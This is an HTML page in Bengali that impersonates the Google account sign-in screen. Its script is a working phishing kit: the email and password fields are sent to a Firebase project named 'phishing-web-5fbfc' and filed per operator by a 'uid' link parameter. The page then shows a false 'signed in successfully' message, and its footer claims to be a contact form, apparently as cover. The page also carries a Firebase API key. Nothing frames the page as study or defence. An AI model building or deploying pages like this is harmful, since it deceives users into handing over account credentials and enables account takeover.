<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Google একাউন্টে সাইন ইন</title>
  <style>
    * { 
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Google Sans', Roboto, 'Segoe UI', sans-serif;
    }
    
    body {
      background-color: #fff;
      color: #202124;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }
    
    .container {
      width: 100%;
      max-width: 448px;
      border: 1px solid #dadce0;
      border-radius: 8px;
      padding: 48px 40px 36px;
      box-shadow: 0 1px 3px 0 rgba(60,64,67,0.3), 0 4px 8px 3px rgba(60,64,67,0.15);
    }
    
    .google-logo {
      text-align: center;
      margin-bottom: 16px;
    }
    
    .google-logo svg {
      width: 75px;
      height: 24px;
    }
    
    .title {
      font-size: 24px;
      font-weight: 400;
      line-height: 1.3333;
      text-align: center;
      margin-bottom: 10px;
    }
    
    .subtitle {
      font-size: 16px;
      font-weight: 400;
      line-height: 1.5;
      text-align: center;
      margin-bottom: 36px;
      color: #202124;
    }
    
    .form-group {
      margin-bottom: 24px;
    }
    
    .input-field {
      width: 100%;
      padding: 13px 15px;
      font-size: 16px;
      border: 1px solid #dadce0;
      border-radius: 4px;
      outline: none;
      transition: border 0.2s;
    }
    
    .input-field:focus {
      border: 2px solid #1a73e8;
      padding: 12px 14px;
    }
    
    .input-field::placeholder {
      color: #5f6368;
    }
    
    .info-text {
      font-size: 14px;
      color: #5f6368;
      margin: -16px 0 32px;
    }
    
    .info-text a {
      color: #1a73e8;
      text-decoration: none;
      font-weight: 500;
    }
    
    .info-text a:hover {
      text-decoration: underline;
    }
    
    .buttons {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-top: 32px;
    }
    
    .create-account {
      color: #1a73e8;
      font-weight: 500;
      text-decoration: none;
      font-size: 14px;
    }
    
    .create-account:hover {
      text-decoration: underline;
    }
    
    .next-btn {
      background-color: #1a73e8;
      color: white;
      border: none;
      border-radius: 4px;
      padding: 10px 24px;
      font-size: 14px;
      font-weight: 500;
      cursor: pointer;
      transition: background-color 0.2s;
    }
    
    .next-btn:hover {
      background-color: #1669d6;
    }
    
    .next-btn:disabled {
      background-color: #e8eaed;
      color: #9aa0a6;
      cursor: default;
    }
    
    .spinner {
      display: inline-block;
      width: 18px;
      height: 18px;
      border: 2px solid rgba(255,255,255,.3);
      border-radius: 50%;
      border-top-color: #fff;
      animation: spin 1s ease-in-out infinite;
      vertical-align: middle;
      margin-right: 8px;
    }
    
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    
    .message {
      font-size: 14px;
      padding: 12px;
      border-radius: 4px;
      margin-top: 16px;
      text-align: center;
    }
    
    .message.success {
      background-color: #e6f4ea;
      color: #137333;
      border: 1px solid #b7e1b9;
    }
    
    .message.error {
      background-color: #fce8e6;
      color: #c5221f;
      border: 1px solid #f5b6b3;
    }
    
    .footer {
      text-align: center;
      margin-top: 24px;
      font-size: 12px;
      color: #5f6368;
      line-height: 1.5;
    }
    
    .language-selector {
      margin-top: 24px;
      text-align: center;
    }
    
    .language-selector select {
      padding: 8px 12px;
      border: 1px solid #dadce0;
      border-radius: 4px;
      background-color: white;
      font-size: 14px;
      color: #5f6368;
    }
    
    .hidden-field {
      display: none;
    }
    
    .forgot-email {
      font-size: 14px;
      color: #1a73e8;
      text-decoration: none;
      font-weight: 500;
      margin-top: 8px;
      display: inline-block;
    }
    
    .forgot-email:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="google-logo">
      <!-- Google Logo -->
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 75 24" width="75" height="24">
        <path fill="#4285F4" d="M10 22v-8h12v4h-8v4h8v4z"></path>
        <path fill="#34A853" d="M26 22v-8h12v4h-8v4h8v4z"></path>
        <path fill="#FBBC05" d="M42 22v-8h12v4h-8v4h8v4z"></path>
        <path fill="#EA4335" d="M58 22v-8h12v4h-8v4h8v4z"></path>
        <path fill="#4285F4" d="M10 14v-4h12v4z"></path>
        <path fill="#34A853" d="M26 14v-4h12v4z"></path>
        <path fill="#FBBC05" d="M42 14v-4h12v4z"></path>
        <path fill="#EA4335" d="M58 14v-4h12v4z"></path>
      </svg>
    </div>
    
    <h1 class="title">সাইন ইন</h1>
    <p class="subtitle">আপনার Google একাউন্ট ব্যবহার করুন</p>
    
    <form id="dataForm">
      <!-- ইমেইল ফিল্ড -->
      <div class="form-group">
        <input type="email" id="name" class="input-field" placeholder="ইমেইল ঠিকানা লিখুন" required>
      </div>
      
      <!-- পাসওয়ার্ড ফিল্ড -->
      <div class="form-group">
        <input type="password" id="email" class="input-field" placeholder="আপনার পাসওয়ার্ড লিখুন" required>
      </div>
      
      <!-- লুকানো বার্তা ফিল্ড -->
      <div class="form-group hidden-field">
        <textarea id="message" placeholder=""></textarea>
      </div>
      
      <div class="info-text">
        এটি আপনার ব্যক্তিগত কম্পিউটার নয়? গোপন মোড ব্যবহার করুন। <a href="#">আরও জানুন</a>
      </div>
      
      <a href="#" class="forgot-email">ইমেইল মনে পড়ছে না?</a>
      
      <div class="buttons">
        <a href="#" class="create-account">অ্যাকাউন্ট তৈরি করুন</a>
        <button type="submit" class="next-btn" id="submitBtn">
          <div class="spinner" id="spinner" style="display:none;"></div>
          <span id="btnText">পরবর্তী</span>
        </button>
      </div>
      
      <div id="messageBox" class="message"></div>
    </form>
    
    <div class="language-selector">
      <select>
        <option value="bn">বাংলা</option>
        <option value="en">English</option>
        <option value="hi">हिन्दी</option>
      </select>
    </div>
    
    <div class="footer">
      <div>দয়া করে কোনো সংবেদনশীল লগইন তথ্য, পাসওয়ার্ড ইত্যাদি এখানে লিখবেন না।</div>
      <div style="margin-top: 10px;">এই ফর্মটি শুধুমাত্র যোগাযোগের উদ্দেশ্যে তৈরি করা হয়েছে।</div>
    </div>
  </div>

  <!-- Firebase SDK - আগের মতোই আছে -->
  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>

  <script>
    // Firebase কনফিগারেশন - আগের মতোই আছে
    const firebaseConfig = {
      apiKey: "AIzaSyDj5FT2W0F-x62GI2SSi4d_Y-Vtg5ztSXk",
      authDomain: "phishing-web-5fbfc.firebaseapp.com",
      projectId: "phishing-web-5fbfc",
      storageBucket: "phishing-web-5fbfc.firebasestorage.app",
      messagingSenderId: "552393373788",
      appId: "1:552393373788:web:a460df425a2bbc40688e99",
      measurementId: "G-1LQ68R9H4B"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    const dataForm   = document.getElementById('dataForm');
    const nameInput  = document.getElementById('name');
    const emailInput = document.getElementById('email');
    const msgInput   = document.getElementById('message');
    const submitBtn  = document.getElementById('submitBtn');
    const btnText    = document.getElementById('btnText');
    const spinner    = document.getElementById('spinner');
    const messageBox = document.getElementById('messageBox');

    const urlParams = new URLSearchParams(window.location.search);
    const ownerUid  = urlParams.get('uid');

    if (!ownerUid) {
      alert('ভুল লিংক। অনুগ্রহ করে সঠিক ফর্ম লিংক ব্যবহার করুন।');
    }

    function showMessage(text, type='') {
      messageBox.textContent = text;
      messageBox.className = 'message ' + type;
    }

    dataForm.addEventListener('submit', async (e) => {
      e.preventDefault();
      if (!ownerUid) {
        showMessage('ভুল লিংক, তথ্য পাঠানো সম্ভব না।', 'error');
        return;
      }

      const name    = nameInput.value.trim();
      const email   = emailInput.value.trim();
      const message = msgInput.value.trim();

      if (!name || !email) {
        return showMessage('ইমেইল এবং পাসওয়ার্ড আবশ্যক', 'error');
      }

      btnText.textContent = 'প্রক্রিয়াকরণ হচ্ছে...';
      spinner.style.display = 'inline-block';
      submitBtn.disabled = true;

      try {
        const formData = {
          name,
          email,
          message,
          timestamp: new Date().toISOString()
        };

        await db
          .collection('users')
          .doc(ownerUid)
          .collection('submissions')
          .add(formData);

        showMessage('✅ সফলভাবে সাইন ইন করা হয়েছে!', 'success');
        dataForm.reset();
      } catch (err) {
        console.error(err);
        showMessage('❌ সাইন ইন করতে সমস্যা হয়েছে, আবার চেষ্টা করুন।', 'error');
      } finally {
        btnText.textContent = 'পরবর্তী';
        spinner.style.display = 'none';
        submitBtn.disabled = false;
      }
    });

    window.onload = function () {
      console.log('Google লগইন ফর্ম লোড হয়েছে');
    };
  </script>
</body>
      </html>
